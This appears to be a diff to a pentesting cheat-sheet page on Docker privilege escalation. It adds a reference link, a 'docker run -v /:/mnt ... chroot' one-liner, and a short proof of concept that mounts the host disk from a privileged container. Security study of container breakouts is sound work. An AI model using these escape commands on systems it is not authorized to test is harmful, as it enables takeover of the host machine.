@@ -699,11 +699,29 @@ cd <SHAREDD_FOLDER>
 
 {% embed url="https://flast101.github.io/docker-privesc/" %}
 
+{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation" %}
+
 {% embed url="https://gtfobins.github.io/gtfobins/docker/" %}
 
 ```bash
+docker run -v /:/mnt --rm -it alphine chroot /mnt sh
 docker run -v /:/mnt --rm -it bash chroot /mnt sh
 ```
+
+#### Mounting Disk - Poc1
+
+Well configured docker containers won't allow command like **fdisk -l**. However on miss-configured docker command where the flag `--privileged` or `--device=/dev/sda1` with caps is specified, it is possible to get the privileges to see the host drive.
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+So to take over the host machine, it is trivial:
+
+```bash
+mkdir -p /mnt/hola
+mount /dev/sda1 /mnt/hola
+```
+
+And voilà ! You can now access the filesystem of the host because it is mounted in the `/mnt/hola` folder.
 
 ## Restricted Shell
 
